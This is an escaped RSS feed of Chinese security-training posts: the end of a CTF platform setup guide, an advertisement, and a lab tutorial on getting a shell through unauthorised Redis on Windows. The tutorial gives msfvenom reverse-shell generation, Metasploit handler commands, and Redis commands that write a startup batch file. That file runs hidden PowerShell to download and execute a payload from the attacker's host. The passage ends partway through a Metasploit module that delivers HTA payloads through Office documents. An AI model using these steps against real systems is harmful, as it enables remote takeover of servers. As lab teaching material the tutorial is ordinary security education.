class=&quot;language-text&quot;&gt;&amp;lt;Directory /var/www/html&amp;gt;
        Options Indexes FollowSymLinks
        AllowOverride ALL
        Require all granted
&amp;lt;/Directory&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;开启 mod_rewrite 模块&lt;/b&gt;&lt;/p&gt;&lt;p&gt;命令：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sudo a2enmod rewrite&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后重启 apache2&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;service apache2 restart&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;导入 .sql 数据库文件&lt;/b&gt;&lt;/p&gt;&lt;p&gt;进入到 @import/confs/ 目录下，导入 init.sql 文件到 sqlite3&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sqlite3 .common.db &amp;lt; init.sql
root@linuz:/var/www/html/@import/confs# sqlite3 .common.db
SQLite version 3.11.0 2016-02-15 17:29:24
Enter &amp;#34;.help&amp;#34; for usage hints.
sqlite&amp;gt; .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE `users` (
        `user_no` INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
        `user_name` TEXT NOT NULL UNIQUE,
        `user_email` TEXT NOT NULL UNIQUE,
        `user_password` TEXT NOT NULL,
        `user_comment` TEXT NOT NULL,
        `user_score` INTEGER NOT NULL,
        `user_signed_up_at` DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
);
......
sqlite&amp;gt; .exit&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后更改 confs 目录权限为 www-data&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sudo chown -R www-data:www-data confs/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;设置 recaptcha&lt;/b&gt;&lt;/p&gt;&lt;p&gt;recaptcha 地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.google.com/recaptcha&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;google.com/recaptcha&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;在上面注册你的平台网站（选择 recaptcha 第3版）&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6e504dd8151d5921a780114ea4369bd4_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;939&quot; data-rawheight=&quot;1174&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;939&quot; data-original=&quot;https://pic1.zhimg.com/v2-6e504dd8151d5921a780114ea4369bd4_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-6e504dd8151d5921a780114ea4369bd4_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;939&quot; data-rawheight=&quot;1174&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;939&quot; data-original=&quot;https://pic1.zhimg.com/v2-6e504dd8151d5921a780114ea4369bd4_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-6e504dd8151d5921a780114ea4369bd4_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;然后获取秘钥：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d5b745c9c61a55ee1963cb58be17bf50_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1409&quot; data-rawheight=&quot;667&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1409&quot; data-original=&quot;https://pic1.zhimg.com/v2-d5b745c9c61a55ee1963cb58be17bf50_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d5b745c9c61a55ee1963cb58be17bf50_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1409&quot; data-rawheight=&quot;667&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1409&quot; data-original=&quot;https://pic1.zhimg.com/v2-d5b745c9c61a55ee1963cb58be17bf50_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-d5b745c9c61a55ee1963cb58be17bf50_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;在平台的配置文件common.php里面，修改一些网站的基本信息，包括网站URL、作者信息等&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-847438c2653cca3548f01d1b0f557c50_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;858&quot; data-rawheight=&quot;685&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;858&quot; data-original=&quot;https://pic1.zhimg.com/v2-847438c2653cca3548f01d1b0f557c50_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-847438c2653cca3548f01d1b0f557c50_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;858&quot; data-rawheight=&quot;685&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;858&quot; data-original=&quot;https://pic1.zhimg.com/v2-847438c2653cca3548f01d1b0f557c50_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-847438c2653cca3548f01d1b0f557c50_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;更换秘钥&lt;/b&gt;&lt;/p&gt;&lt;p&gt;第一个密钥替换 common.php 文件里的 recaptcha_sitekey 内容&lt;/p&gt;&lt;p&gt;第二个密钥编辑成 .recaptcha_secretkey.txt 文件，放到 @import/confs 路径下&lt;/p&gt;&lt;h2&gt;创建题目&lt;/h2&gt;&lt;p&gt;平台没有后台，所以只能直接访问 sqlite3 数据库添加题目&lt;/p&gt;&lt;p&gt;添加题目命令：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sqlite&amp;gt; INSERT INTO &amp;#34;chals&amp;#34; VALUES(1,&amp;#39;name&amp;#39;,&amp;#39;title&amp;#39;,&amp;#39;contents&amp;#39;,100,&amp;#39;CanHackMe{xxxxxxxxxxxx}&amp;#39;,&amp;#39;web&amp;#39;,&amp;#39;1&amp;#39;,&amp;#39;2019-09-12&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看题目：&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-389c954a050d187e4eaa68318159c578_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1602&quot; data-rawheight=&quot;663&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1602&quot; data-original=&quot;https://pic1.zhimg.com/v2-389c954a050d187e4eaa68318159c578_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-389c954a050d187e4eaa68318159c578_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1602&quot; data-rawheight=&quot;663&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1602&quot; data-original=&quot;https://pic1.zhimg.com/v2-389c954a050d187e4eaa68318159c578_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-389c954a050d187e4eaa68318159c578_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;发送公告：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;sqlite&amp;gt; INSERT INTO &amp;#34;notis&amp;#34; VALUES(1,&amp;#39;xxx&amp;#39;,1,&amp;#39;2020-01-09&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-cc79cf771cf800bbed34d235ef819458_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1319&quot; data-rawheight=&quot;398&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1319&quot; data-original=&quot;https://pic1.zhimg.com/v2-cc79cf771cf800bbed34d235ef819458_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-cc79cf771cf800bbed34d235ef819458_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1319&quot; data-rawheight=&quot;398&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1319&quot; data-original=&quot;https://pic1.zhimg.com/v2-cc79cf771cf800bbed34d235ef819458_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-cc79cf771cf800bbed34d235ef819458_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;设置 flag&lt;/b&gt;&lt;/p&gt;&lt;p&gt;flag 的默认的格式为 CanHackMe{...} 且长度不小于 10 位数，可以在 init.php 文件中修改。&lt;/p&gt;&lt;p&gt;把 CanHackMe 修改成你想要的格式：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-a4d5e1c9ffd744591355f70842c3498e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1001&quot; data-rawheight=&quot;76&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1001&quot; data-original=&quot;https://pic3.zhimg.com/v2-a4d5e1c9ffd744591355f70842c3498e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-a4d5e1c9ffd744591355f70842c3498e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1001&quot; data-rawheight=&quot;76&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1001&quot; data-original=&quot;https://pic3.zhimg.com/v2-a4d5e1c9ffd744591355f70842c3498e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-a4d5e1c9ffd744591355f70842c3498e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;PS：&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;的网络安全技能包更新了！无需登录、无需扫描，只需点击下方链接即可畅玩技能包。（CISP-PTE 技能包、CTF 技能包即将上线，敬请关注！）&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1192&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;2560&quot; data-original=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1192&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;2560&quot; data-original=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//lelge.exeye.run/skill_library_o&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;新手入门 | 梦境穿越 - 主题技能包&lt;/a&gt;&lt;p&gt;更多有关渗透测试的内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-09-101994123</guid>
<pubDate>Thu, 09 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>帮转转</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-09-101955934.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/101955934&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1192&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;2560&quot; data-original=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2560&quot; data-rawheight=&quot;1192&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;2560&quot; data-original=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-41a1365ee0d9566c882af75894478f08_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//lelge.exeye.run/skill_library_o&quot; data-draft-node=&quot;block&quot; data-draft-type=&quot;link-card&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;新手入门 | 梦境穿越 - 主题技能包&lt;/a&gt;&lt;p&gt;&lt;b&gt;                                                                 点进去，直接玩&lt;/b&gt;&lt;/p&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-09-101955934</guid>
<pubDate>Thu, 09 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>Windows下Redis Getshell总结</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-08-101701119.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/101701119&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-650ce066a43c3fdedd0bcaff2bd3e5ff_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;Redis&lt;/h2&gt;&lt;p&gt;Redis 是一个开源的高性能键值数据库。最热门的 NoSql 数据库之一，也被人们称为数据结构服务器。&lt;/p&gt;&lt;p&gt;它最突出的特点就是：&lt;b&gt;快&lt;/b&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;以内存作为数据存储介质，读写数据的效率极高。&lt;/li&gt;&lt;li&gt;跟 memcache 不同的是，储存在 Redis 中的数据是持久化的，断电或重启，数据也不会丢失。&lt;/li&gt;&lt;li&gt;存储分为内存存储、磁盘存储和 log 文件。&lt;/li&gt;&lt;li&gt;可以从磁盘重新将数据加载到内存中，也可以通过配置文件对其进行配置，因此，redis 才能实现持久化。&lt;/li&gt;&lt;li&gt;支持主从模式，可以配置集群，更利于支撑大型的项目。&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;搭建环境&lt;/h2&gt;&lt;p&gt;靶机 Windows Server 2012 &lt;/p&gt;&lt;p&gt;攻击机：kali linux&lt;/p&gt;&lt;p&gt;Redis 下载：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/microsoftarchive/redis&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/microsoftarc&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;hive/redis&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; （这里用的是 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/microsoftarchive/redis/releases/download/win-3.2.100/Redis-x64-3.2.100.msi&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;3.2.100 版本&lt;/a&gt;）&lt;/p&gt;&lt;p&gt;安装完 Redis 后会自动启动，先停止 Redis 服务&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;redis-server --service-stop&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;更改配置文件&lt;/b&gt;&lt;/p&gt;&lt;p&gt;进入 Redis 的安装目录，然后修改 windows.conf 文件&lt;/p&gt;&lt;p&gt;注释掉# bind 127.0.0.1&lt;/p&gt;&lt;p&gt;把 protected-mode yes 改成 protected-mode no&lt;/p&gt;&lt;p&gt;这样就可以模拟未授权访问的 Redis 靶机。&lt;/p&gt;&lt;p&gt;&lt;b&gt;端口设置&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Redis 默认端口是 6379，所以需要在 windows 的防火墙里开放 6379 端口，或者靶机直接就关闭防火墙。&lt;/p&gt;&lt;p&gt;&lt;b&gt;测试未授权访问&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;./redis-cli -h xxx.xxx.xxx.xxx&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;配置 Windows server 2012&lt;/b&gt;&lt;/p&gt;&lt;p&gt;默认是无法在启动项文件夹写文件的，需要把 C:\Users\Administrator 文件夹的组添加上 Everyone 并把权限改成完全控制。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;config set dir &amp;#34;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&amp;#34;
OK&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;相关命令：&lt;/b&gt;&lt;/p&gt;&lt;p&gt;卸载 Redis 服务&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;redis-server --service-uninstall&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;安装 Redis 服务&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;redis-server --service-install redis.windows.conf&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;启动 Redis 服务&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;redis-server --service-start &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;下面介绍今天的主题，几种 Redis Getshell 的方法&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;几种 &lt;/b&gt;Redis&lt;b&gt; Getshell 方法&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;001——利用 powershell 反弹 shell&lt;/b&gt;&lt;/p&gt;&lt;p&gt;先用 msfvenom 生成 shell.ps1 文件&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -f psh-reflection &amp;gt;shell.ps1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后把 shell.ps1 文件复制到 /var/www/html 目录下，然后启动 apache2&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c83c0eed4b1814ea5bf58af171173775_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1269&quot; data-rawheight=&quot;208&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1269&quot; data-original=&quot;https://pic2.zhimg.com/v2-c83c0eed4b1814ea5bf58af171173775_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-c83c0eed4b1814ea5bf58af171173775_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1269&quot; data-rawheight=&quot;208&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1269&quot; data-original=&quot;https://pic2.zhimg.com/v2-c83c0eed4b1814ea5bf58af171173775_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-c83c0eed4b1814ea5bf58af171173775_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;用 msf 进行监听，设置 payload 的时候注意区分 32 位和 64 位操作系统&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;msf5 &amp;gt; use exploit/multi/handler 
msf5 exploit(multi/handler) &amp;gt; set payload windows/x64/meterpreter/reverse_tcp
payload =&amp;gt; windows/x64/meterpreter/reverse_tcp&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7546e33183f68b3405a6f4d168a4a520_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;890&quot; data-rawheight=&quot;228&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;890&quot; data-original=&quot;https://pic1.zhimg.com/v2-7546e33183f68b3405a6f4d168a4a520_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7546e33183f68b3405a6f4d168a4a520_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;890&quot; data-rawheight=&quot;228&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;890&quot; data-original=&quot;https://pic1.zhimg.com/v2-7546e33183f68b3405a6f4d168a4a520_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-7546e33183f68b3405a6f4d168a4a520_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;利用 Redis 写入 bat 文件到启动项&lt;/p&gt;&lt;p&gt;注意  \r\n\r\n 代表换行的意思，因为用 redis 写的文件会自带一些版本信息，如果不换行可能会导致无法执行。反斜杠用来转义 payload 中的双引号。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;xxx.xxx.xxx.1:6379&amp;gt; config set dir &amp;#34;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&amp;#34;
OK
xxx.xxx.xxx.1:6379&amp;gt; config set dbfilename shell.bat
OK
xxx.xxx.xxx.1:6379&amp;gt; set x &amp;#34;\r\n\r\npowershell -windowstyle hidden -exec bypass -c \&amp;#34;IEX (New-Object Net.WebClient).DownloadString(&amp;#39;http://xxx.xxx.xxx.2/shell.ps1&amp;#39;);xx.ps1\&amp;#34;\r\n\r\n&amp;#34;
OK
xxx.xxx.xxx.1:6379&amp;gt; save
OK&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;重启后得到 shell&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-56aa0a7a9deed695474e2a25e25fee07_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1232&quot; data-rawheight=&quot;340&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1232&quot; data-original=&quot;https://pic4.zhimg.com/v2-56aa0a7a9deed695474e2a25e25fee07_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-56aa0a7a9deed695474e2a25e25fee07_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1232&quot; data-rawheight=&quot;340&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1232&quot; data-original=&quot;https://pic4.zhimg.com/v2-56aa0a7a9deed695474e2a25e25fee07_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-56aa0a7a9deed695474e2a25e25fee07_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;002——使用 mshta.exe&lt;/b&gt;&lt;/p&gt;&lt;p&gt;到 /usr/share/metasploit-framework/modules/exploits/windows 目录下创建一个 msh_shell.rb 文件，复制以下内容。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
  
  
class MetasploitModule  &amp;lt; Msf::Exploit::Remote
  Rank = NormalRanking
  
  include Msf::Exploit::Remote::HttpServer
  
  def initialize(info  = {})
    super(update_info(info,
      &amp;#39;Name&amp;#39; =&amp;gt; &amp;#39;Microsoft Office Payload Delivery&amp;#39;,
      &amp;#39;Description&amp;#39; =&amp;gt; %q{
        This module generates an command to place within
        a word document, that when executed, will retrieve a HTA payload
        via HTTP from an web server. Currently have not figured out how
        to generate a doc.
      },
      &amp;#39;License&amp;#39; =&amp;gt; MSF_LICENSE,
      &amp;#39;Arch&amp;#39; =&amp;gt; ARCH_X86,
      &amp;#39;Platform&amp;#39; =&amp;gt; &amp;#39;win&amp;#39;,
      &amp;#39;Targets&amp;#39; =&amp;gt;
        [
          [&amp;#39;Automatic&amp;#39;, {} ],
        ],
      &amp;#39;DefaultTarget&amp;#39; =&amp;gt; 0,
    ))
  end
  
  def on_request_uri(cli, _request)
    print_status(&amp;#34;Delivering payload&amp;#34;)
    p = regenerate_payload(cli)
    data = Msf::Util::EXE.to_executable_fmt(
      framework,
      ARCH_X86,
      &amp;#39;win&amp;#39;,
      p.encoded,
      &amp;#39;hta-psh&amp;#39;,
      { :arch =&amp;gt; ARCH_X86, :platform =&amp;gt; &amp;#39;win &amp;#39;}
    )
    send_response(cli, data, &amp;#39;Content-Type&amp;#39; =&amp;gt; &amp;#39;application/hta&amp;#39;)
  end
  
  
  def primer
    url = get_uri
    print_status(&amp;#34;Place the following DDE in an MS document:&amp;#34;)
